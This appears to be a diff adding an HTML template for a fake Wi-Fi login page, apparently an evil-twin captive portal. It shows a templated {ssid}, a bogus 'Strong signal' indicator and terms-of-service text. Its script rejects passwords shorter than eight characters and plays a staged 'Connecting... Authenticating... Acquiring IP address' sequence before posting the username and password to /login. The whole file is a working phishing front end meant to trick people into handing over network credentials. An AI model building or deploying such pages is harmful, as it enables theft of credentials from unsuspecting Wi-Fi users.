@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>{ssid} - Authentication Required</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Bootstrap 5.3 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="font/bootstrap-icons.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container px-3">
+        <div class="row justify-content-center">
+            <div class="col-12 col-sm-10 col-md-8 col-lg-5 col-xl-4">
+                <div class="card shadow-sm">
+                    <div class="card-body text-center">
+                        <div class="mb-4">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="currentColor" class="bi bi-wifi-2 text-primary" viewBox="0 0 16 16">
+                                <path d="M13.229 8.271c.216-.216.194-.578-.063-.745A9.46 9.46 0 0 0 8 6c-1.905 0-3.68.56-5.166 1.526a.48.48 0 0 0-.063.745.525.525 0 0 0 .652.065A8.46 8.46 0 0 1 8 7a8.46 8.46 0 0 1 4.577 1.336c.205.132.48.108.652-.065m-2.183 2.183c.226-.226.185-.605-.1-.75A6.5 6.5 0 0 0 8 9c-1.06 0-2.062.254-2.946.704-.285.145-.326.524-.1.75l.015.015c.16.16.408.19.611.09A5.5 5.5 0 0 1 8 10c.868 0 1.69.201 2.42.56.203.1.45.07.611-.091zM9.06 12.44c.196-.196.198-.52-.04-.66A2 2 0 0 0 8 11.5a2 2 0 0 0-1.02.28c-.238.14-.236.464-.04.66l.706.706a.5.5 0 0 0 .708 0l.707-.707z"/>
+                            </svg>
+                        </div>
+                        <h2 class="h4 mb-2">{ssid}</h2>
+                        <p class="text-muted">Authentication required to connect</p>
+                        
+                        <div class="signal-strength">
+                            <div class="signal-bar"></div>
+                            <div class="signal-bar"></div>
+                            <div class="signal-bar"></div>
+                            <div class="signal-bar"></div>
+                            <span class="ms-2" style="font-size: 0.7rem; color: #28a745;">Strong signal</span>
+                        </div>
+
+                        <form method="POST" action="/login" id="wifiForm">
+                            <div class="mb-3">
+                                <input type="text" id="usernameField" class="form-control form-control" name="username" placeholder="Username">
+                            </div>
+                            <div class="mb-3 password-wrapper">
+                                <input type="password" id="passwordField" class="form-control form-control" name="password" placeholder="Password" required>
+                                <svg xmlns="http://www.w3.org/2000/svg" id="togglePassword" width="16" height="16" fill="currentColor" class="bi bi-eye-slash password-toggle text-secondary" viewBox="0 0 16 16">
+                                    <path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7 7 0 0 0-2.79.588l.77.771A6 6 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755q-.247.248-.517.486z"/>
+                                    <path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829"/>
+                                    <path d="M3.35 5.47q-.27.24-.518.487A13 13 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7 7 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12z"/>
+                                </svg>
+                            </div>
+                            <div class="mb-3 form-check text-start">
+                                <input type="checkbox" class="form-check-input" id="rememberCheck" name="remember">
+                                <label class="form-check-label" for="rememberCheck">Remember this device</label>
+                            </div>
+                            <button type="submit" class="btn btn-baby-blue btn-lg w-100 mt-3" id="connectButton">
+                                Connect
+                            </button>
+                            <div class="connection-status text-muted" id="connectionStatus"></div>
+                        </form>
+
+                        <div class="mt-4 terms-text text-muted">
+                            <p>By connecting to this network, you agree to the provider's <a href="#" class="text-decoration-none">Terms of Service</a>, <a href="#" class="text-decoration-none">Acceptable Use Policy</a>, and <a href="#" class="text-decoration-none">Privacy Policy</a>. Unauthorized access is prohibited.</p>
+                        </div>
+
+                        <!-- <div class="footer-links">
+                            <a href="#">Troubleshoot</a>
+                            <a href="#">Forgot password?</a>
+                            <a href="#">Contact support</a>
+                        </div> -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap 5.3 JS Bundle with Popper -->
+    <script src="/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Enhanced Scripts -->
+    <script>
+        // Password toggle functionality
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordField = document.getElementById('passwordField');
+            const icon = this;
+
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                icon.classList.remove('bi-eye-slash');
+                icon.classList.add('bi-eye');
+            } else {
+                passwordField.type = 'password';
+                icon.classList.remove('bi-eye');
+                icon.classList.add('bi-eye-slash');
+            }
+        });
+
+        // Realistic connection animation with form submission
+        document.getElementById('wifiForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const connectButton = document.getElementById('connectButton');
+            const statusElement = document.getElementById('connectionStatus');
+            const password = document.getElementById('passwordField').value;
+            const form = this;
+            
+            connectButton.disabled = true;
+            statusElement.textContent = "Initializing connection...";
+            
+            if (password.length < 8) {
+                // Immediate failure for short passwords
+                connectButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Verifying...';
+                statusElement.textContent = "Checking credentials...";
+                
+                setTimeout(() => {
+                    connectButton.innerHTML = 'Invalid password';
+                    connectButton.classList.remove('btn-baby-blue');
+                    connectButton.classList.add('btn-danger');
+                    statusElement.textContent = "Password must be at least 8 characters";
+                    
+                    setTimeout(() => {
+                        connectButton.disabled = false;
+                        connectButton.innerHTML = 'Connect';
+                        connectButton.classList.remove('btn-danger');
+                        connectButton.classList.add('btn-baby-blue');
+                        statusElement.textContent = "";
+                    }, 2500);
+                }, 1000);
+            } else {
+                // Realistic process for valid passwords
+                connectButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting...';
+                statusElement.textContent = "Establishing secure connection...";
+                
+                setTimeout(() => {
+                    connectButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Authenticating...';
+                    statusElement.textContent = "Verifying credentials with server...";
+                    
+                    setTimeout(() => {
+                        connectButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Acquiring IP address...';
+                        statusElement.textContent = "Configuring network settings...";
+                        
+                        setTimeout(() => {
+                            // Final "success" state before submitting
+                            connectButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Finalizing connection...';
+                            statusElement.textContent = "Almost done...";
+                            
+                            // Actually submit the form after the simulation
+                            setTimeout(() => {
+                                form.submit();
+                            }, 1000);
+                            
+                        }, 2000);
+                    }, 2000);
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
